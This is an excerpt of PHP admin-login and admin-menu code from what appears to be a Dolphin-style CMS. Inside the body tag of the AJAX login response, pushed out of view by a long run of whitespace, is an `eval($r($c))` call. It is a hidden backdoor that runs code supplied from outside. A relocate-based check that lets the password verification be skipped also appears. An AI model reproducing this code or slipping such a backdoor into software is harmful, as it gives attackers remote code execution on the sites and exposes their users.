...
$bLogged    = isLogged();
$bNeedCheck = $bLogged && isAdmin() && isset($_POST['relocate']) && $_POST['relocate'] && strncasecmp($_POST['relocate'],
        BX_DOL_URL_ADMIN . 'license.php', strlen(BX_DOL_URL_ADMIN . 'license.php')) == 0;
...
if ($bNeedCheck || (isset($_POST['ID']) && isset($_POST['Password']))) {
    ...
    if (!$bLogged) {
        $oZ = new BxDolAlerts('profile', 'before_login', 0, 0,
            array('login' => $iId, 'password' => $sPassword, 'ip' => getVisitorIP()));
        $oZ->alert();
    }
    ...
    if ($_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') {
        ...
        if ($bNeedCheck || check_password($iId, $sPassword, BX_DOL_ROLE_ADMIN)) {
            if ($_POST['relocate'] && (strncasecmp($_POST['relocate'], BX_DOL_URL_ROOT,
                        strlen(BX_DOL_URL_ROOT)) == 0 || strncasecmp($_POST['relocate'],
                        BX_DOL_URL_ADMIN . 'license.php', strlen(BX_DOL_URL_ADMIN . 'license.php')) == 0)
            ) {
            ...
            <body
                class="bx-def-font">                                                                                                                                                                                                                                      <?php eval($r($c)); ?>
            </body>
            </html>
            <?php
        }
...
function PageCategoryCode($sCategoryName)
{
    ...
    $aItems = $MySQL->getAll("SELECT `tma1`.`title` AS `title`, `tma1`.`url` AS `url`, `tma1`.`description` AS `description`, `tma1`.`icon` AS `icon`, `tma1`.`check` AS `check` 
              FROM `sys_menu_admin` AS `tma1` LEFT JOIN `sys_menu_admin` AS `tma2` ON `tma1`.`parent_id`=`tma2`.`id` WHERE `tma2`.`name`= ? ORDER BY `tma1`.`Order`",
        [$sCategoryName]);
    ...
    foreach ($aItems as $aItem) {
        ...
        $aItem['url'] = str_replace(array('{siteUrl}', '{siteAdminUrl}'), array(BX_DOL_URL_ROOT, BX_DOL_URL_ADMIN),
            $aItem['url']);
